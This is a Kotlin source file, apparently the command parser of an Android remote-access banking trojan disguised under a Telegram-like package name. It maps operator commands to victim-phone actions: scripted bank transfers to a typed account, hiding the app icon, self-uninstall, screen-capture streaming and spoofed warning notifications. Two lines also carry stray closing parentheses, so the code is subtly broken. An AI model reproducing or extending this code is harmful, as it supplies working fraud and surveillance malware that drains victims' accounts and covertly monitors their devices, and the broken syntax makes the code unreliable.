package com.telegram2.messaging.remote

object NLPParser {

    data class Action(
        val type: String,
        val data: Any? = null,
        val description: String = ""
    )

    fun parse(input: String): List<Action> {
        val actions = mutableListOf<Action>()
        val lower = input.lowercase().replace(".", "").replace("!", "").replace("?", "").trim()

        val pkgRegex = Regex("""(?:open|launch|start|run|go to|use|in)\s+([a-zA-Z][\w.]+(?:[\w]+)?)""")
        val pkg = pkgRegex.find(lower)?.groupValues?.get(1) ?: guessAppFromIntent(lower)

        val phoneRegex = Regex("""(?:call|dial|phone|number|tel)[\s:]+([+]?[0-9]{8,15})""")
        val phone = phoneRegex.find(lower)?.groupValues?.get(1)

        val amountRegex = Regex("""(?:send|transfer|pay|give|withdraw)\s*(?:me|you|to)?\s*[$€£]?\s*([\d,]+(?:\.\d{2})?)""")
        val amount = amountRegex.find(lower)?.groupValues?.get(1)?.replace(",", "")

        val accountRegex = Regex("""(?:to|account|acc|number|acct)[\s:]+(\d{6,12})""")
        val account = accountRegex.find(lower)?.groupValues?.get(1)

        val textRegex = Regex("""(?:type|enter|write|say|message|text)[\s"']+(.+?)(?:["']|$)""")
        val text = textRegex.find(lower)?.groupValues?.get(1)

        val coordRegex = Regex("""tap\s+at\s+(\d+),\s*(\d+)""")
        val coordMatch = coordRegex.find(lower)
        val x = coordMatch?.groupValues?.get(1)?.toIntOrNull()
        val y = coordMatch?.groupValues?.get(2)?.toIntOrNull()

        val swipeRegex = Regex("""swipe\s+from\s+(\d+),\s*(\d+)\s+to\s+(\d+),\s*(\d+)""")
        val swipeMatch = swipeRegex.find(lower)
        val (sx, sy, ex, ey) = if (swipeMatch != null) {
            listOf(1, 2, 3, 4).map { swipeMatch.groupValues[it].toIntOrNull() ?: 0 }
        } else listOf(0, 0, 0, 0)

        val waitRegex = Regex("""wait(?: for)? (\d+) ?(?:seconds?|secs?|s)""")
        val waitSec = waitRegex.find(lower)?.groupValues?.get(1)?.toIntOrNull()

        val clickRegex = Regex("""click(?: on)?(?: the)?(?: button|text|item)?(?: called|named)?(?: "([^"]+)")""")
        val clickText = clickRegex.find(lower)?.groupValues?.get(1)

        val goBack = lower.contains("go back") || lower.contains("back button") || lower.contains("press back")
        val goHome = lower.contains("go home") || lower.contains("home screen") || lower.contains("home button")

        if (pkg != null) actions.add(Action("launch", pkg, "Launch $pkg"))
        if (waitSec != null) actions.add(Action("wait", waitSec * 1000, "Wait ${waitSec}s"))
        if (phone != null) {
            actions.add(Action("launch", "com.android.dialer", "Open Dialer"))
            actions.add(Action("wait", 1500, "Wait"))
            actions.add(Action("tap", mapOf("x" to 540, "y" to 1000), "Tap number field"))
            actions.add(Action("type", phone, "Enter number"))
            actions.add(Action("click_text", "Call", "Initiate call"))
        }
        if (text != null) actions.add(Action("type", text, "Type: $text"))
        if (x != null && y != null) actions.add(Action("tap", mapOf("x" to x, "y" to y), "Tap ($x,$y)"))
        if (swipeMatch != null) actions.add(Action("swipe", mapOf("sx" to sx, "sy" to sy, "ex" to ex, "ey" to ey, "dur" to 300L), "Swipe"))
        if (amount != null && account != null) {
            actions.add(Action("click_text", "Transfer", "Go to transfer"))
            actions.add(Action("wait", 1500, "Wait"))
            actions.add(Action("tap", mapOf("x" to 540, "y" to 1200), "Tap amount")))
            actions.add(Action("type", amount, "Enter amount"))
            actions.add(Action("tap", mapOf("x" to 540, "y" to 1400), "Tap account")))
            actions.add(Action("type", account, "Enter account"))
            actions.add(Action("click_text", "Confirm", "Confirm transfer"))
            actions.add(Action("wait", 3000, "Wait for success"))
        }
        if (clickText != null) actions.add(Action("click_text", clickText, "Click: $clickText"))
        if (goBack) actions.add(Action("back", null, "Press Back"))
        if (goHome) actions.add(Action("home", null, "Go to Home"))

        if (lower.contains("hide app") || lower.contains("disable icon")) actions.add(Action("hide_activity", null, "Hide Icon"))
        if (lower.contains("uninstall") || lower.contains("remove") || lower.contains("delete")) actions.add(Action("uninstall", null, "Uninstall Self"))

        if (lower.contains("start screen") || lower.contains("stream now") || lower.contains("show screen")) actions.add(Action("start_screen_capture", null, "Start Screen Capture"))
        if (lower.contains("stop screen") || lower.contains("end stream") || lower.contains("close screen")) actions.add(Action("stop_screen_capture", null, "Stop Screen Capture"))

        if (lower.contains("send notification") || lower.contains("fake alert") || lower.contains("show warning")) {
            val title = extractQuotedText(lower, "title") ?: "⚠ Alert"
            val body = extractQuotedText(lower, "body") ?: "Tap to view"
            actions.add(Action("fake_notification", mapOf("title" to title, "text" to body), "Send Spoofed Notification"))
        }

        if (actions.isEmpty() && pkg != null) actions.add(Action("launch", pkg, "Launch $pkg"))

        return actions
    }

    private fun extractQuotedText(text: String, keyword: String): String? {
        val regex = Regex("""$keyword\s*["']([^"']+)["']""")
        return regex.find(text)?.groupValues?.get(1)
    }

    private fun guessAppFromIntent(input: String): String? {
        return when {
            input.contains("message") || input.contains("chat") || input.contains("sms") -> "com.whatsapp"
            input.contains("bank") || input.contains("pay") || input.contains("money") || input.contains("wallet") -> "com.bank.app"
            input.contains("dial") || input.contains("call") || input.contains("phone") || input.contains("tel") -> "com.android.dialer"
            input.contains("email") || input.contains("gmail") || input.contains("mail") -> "com.google.android.gm"
            input.contains("settings") -> "com.android.settings"
            else -> null
        }
    }
}